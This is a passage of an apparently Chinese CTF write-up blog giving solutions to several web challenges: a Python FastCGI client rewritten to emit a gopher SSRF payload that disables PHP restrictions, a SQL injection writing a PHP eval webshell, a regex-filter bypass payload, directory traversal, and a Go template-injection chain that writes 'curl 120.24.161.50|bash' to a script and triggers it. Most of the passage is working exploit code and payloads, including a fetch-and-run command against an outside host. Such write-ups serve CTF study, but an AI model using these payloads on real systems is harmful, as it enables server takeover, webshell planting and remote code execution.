class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 前面都是构造的tcp数据包,下面是发送,所以我们可以直接注释掉下面内容,然后返回request</span></span><br><span class="line">        <span class="comment">#self.sock.send(request)</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;response&#x27;] = &#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#return self.__waitForResponse(requestId)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span>(<span class="params">self, requestId</span>):</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;39001&#x27;</span></span><br><span class="line">    client = FastCGIClient(host, port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = <span class="string">&#x27;/var/www/html/index.php&#x27;</span></span><br><span class="line">    content = <span class="string">&#x27;&lt;?=antsystem(&quot;/readflag&quot;);?&gt;&#x27;</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;39001&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % len(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;disable_classes = \ndisable_functions = \nopen_basedir = /\nauto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;extension_dir = /tmp\nextension = mb.so\nallow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了</span></span><br><span class="line">    <span class="comment">#response = client.request(params, content)</span></span><br><span class="line">    <span class="comment">#print(force_text(response))</span></span><br><span class="line">    request_data = client.request(params, content)</span><br><span class="line">    print(<span class="string">&quot;gopher://127.0.0.1:&quot;</span> + str(port) + <span class="string">&quot;/_&quot;</span> + urlparse.quote(request_data))</span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    print(urlparse.quote(base64.b64encode(request_data)))</span><br></pre></td></tr></table></figure>
+
+<h3 id="潘叔的钱包的附件"><a href="#潘叔的钱包的附件" class="headerlink" title="潘叔的钱包的附件"></a>潘叔的钱包的附件</h3><p>admin:admin登陆后台</p>
+<p>admin/op_download.php联合查询写shell 13列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x2F;op_download.php?batch&#x3D;-1&#39; UNION SELECT 1,2,3,4,5,&#39;&lt;?&#x3D;eval($_POST[1])?&gt;&#39;,7,8,9,10,11,12,13 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;2.php&#39;%23</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="bestphp"><a href="#bestphp" class="headerlink" title="bestphp"></a>bestphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//flag is located in flag.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) )&#123;</span><br><span class="line">    $a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>( strlen($a)&gt;<span class="number">27</span> )&#123;</span><br><span class="line">        <span class="keyword">die</span>(strval(strlen($a)) . <span class="string">&quot; Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( preg_match(<span class="string">&quot;/[A-Zb-z0-9_$.&amp;;|^~![\]()&#123;&lt;,&#125;\$@\*]+/&quot;</span>, $a) )&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hackboy.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;&quot;</span> . $a .<span class="string">&quot;&#x27;;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;a&#39;?&#96;&#x2F;???&#x2F;?a? ????????&#96;:&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="firstweb"><a href="#firstweb" class="headerlink" title="firstweb"></a>firstweb</h3><p>通过目录穿越任意文件读取读到源码 payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read?id&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;web&#x2F;web.go</span><br></pre></td></tr></table></figure>
+
+<p><strong>web.go：</strong></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> web</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;html/template&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">()</span></span>&#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line"></span><br><span class="line">	r.Static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./web/static/&quot;</span>)</span><br><span class="line">	<span class="comment">//code in common.go</span></span><br><span class="line">	r.SetFuncMap(template.FuncMap&#123;</span><br><span class="line">		<span class="string">&quot;Test&quot;</span>: Common_Test,</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.LoadHTMLGlob(<span class="string">&quot;./web/templates/*&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// code in controller.go</span></span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>,Index)</span><br><span class="line">	r.GET(<span class="string">&quot;/read&quot;</span>,Read)</span><br><span class="line">	r.POST(<span class="string">&quot;/write&quot;</span>,Write)</span><br><span class="line">	r.GET(<span class="string">&quot;/news&quot;</span>,Parser)</span><br><span class="line"></span><br><span class="line">	r.Run(<span class="string">&quot;0.0.0.0:8081&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>controller.go：</strong></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> web</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	data := gin.H&#123;</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;geneva is working.&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Read</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	dir, _ := os.Getwd()</span><br><span class="line">	path := dir + <span class="string">&quot;/web/templates/&quot;</span> + c.Query(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	fmt.Println(path)</span><br><span class="line">	c.File(path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Write</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	template_name := c.Request.PostFormValue(<span class="string">&quot;template_name&quot;</span>)</span><br><span class="line">	template_context := c.Request.PostFormValue(<span class="string">&quot;template_context&quot;</span>)</span><br><span class="line"></span><br><span class="line">	dir, _ := os.Getwd()</span><br><span class="line">	path := dir + <span class="string">&quot;/web/templates/&quot;</span> + template_name</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> WriteTemplate(path, template_context) &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, <span class="string">&quot;faild&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Parser</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	name := c.Query(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	fmt.Println(name)</span><br><span class="line">	<span class="keyword">if</span> name == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		name = <span class="string">&quot;index&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	data := gin.H&#123;</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;writer&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	dir, _ := os.Getwd()</span><br><span class="line">	filepath := dir + <span class="string">&quot;/web/templates/&quot;</span> + name</span><br><span class="line">	<span class="keyword">if</span> FileExists(filepath) &#123;</span><br><span class="line">		c.HTML(<span class="number">200</span>, name, data)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, <span class="string">&quot;not found&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Read函数可以任意文件读取 Write函数可以向templates目录下写文件 题目提示ssti</p>
+<p><strong>common.go：</strong></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> web</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WriteTemplate</span><span class="params">(filename, template <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> strings.Contains(filename, <span class="string">&quot;go&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	f, err := os.OpenFile(filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, <span class="number">0666</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(err.Error())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_, err = f.Write([]<span class="keyword">byte</span>(template))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(err.Error())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">	f.Close()</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FileExists</span><span class="params">(path <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	_, err := os.Stat(path) <span class="comment">//os.Stat获取文件信息</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> os.IsExist(err) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Common_Test</span><span class="params">(pass <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> pass == <span class="string">&quot;ctfisverycool&quot;</span>&#123;</span><br><span class="line">		res := Exec(<span class="string">&quot;L3RtcC90ZXN0LnNo&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> res</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;auth&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ShellToUse = <span class="string">&quot;bash&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Exec</span><span class="params">(command <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	sDecCommand, err := base64.StdEncoding.DecodeString(command)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;base64 decode failure, error=[%v]\n&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> stdout bytes.Buffer</span><br><span class="line">	fmt.Println(ShellToUse, <span class="keyword">string</span>(sDecCommand))</span><br><span class="line">	cmd := exec.Command(ShellToUse,  <span class="keyword">string</span>(sDecCommand))</span><br><span class="line">	cmd.Stdout = &amp;stdout</span><br><span class="line">	_ = cmd.Run()</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;executive.....&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里又有两个高危函数 可以命令执行 Common_Test函数可以写任意文件 并且没做限制 并且在web.go中又有</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r.SetFuncMap(template.FuncMap&#123;</span><br><span class="line">	<span class="string">&quot;Test&quot;</span>: Common_Test,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这段代码就是自定义一个Test函数 可以在模板里面调用 相当于调用Common_Test方法</p>
+<p><img src="/2021/01/06/%E5%86%85%E9%83%A8wp/edi/image-20210121155431619.png" alt="image-20210121155431619"></p>
+<p>关于模板内置函数可以参考：<a target="_blank" rel="noopener" href="https://www.liwenzhou.com/posts/Go/go_template/">https://www.liwenzhou.com/posts/Go/go_template/</a></p>
+<p>解题思路就是向/tmp/test.sh写要执行的命令 然后通过模板解析触发执行达到命令执行的效果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">template_name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;test.sh&amp;template_context&#x3D;curl 120.24.161.50|bash</span><br></pre></td></tr></table></figure>
+
+<p>在模板里执行函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Test &quot;ctfisverycool&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>写入模板</p>
+<p><img src="/2021/01/06/%E5%86%85%E9%83%A8wp/edi/image-20210121172820930.png" alt="image-20210121172820930"></p>
+<p>同样方式写入反弹shell的命令 注意url编码 请求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">news?id&#x3D;123.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="qcode"><a href="#qcode" class="headerlink" title="qcode"></a>qcode</h3><p>扫描就完事了</p>
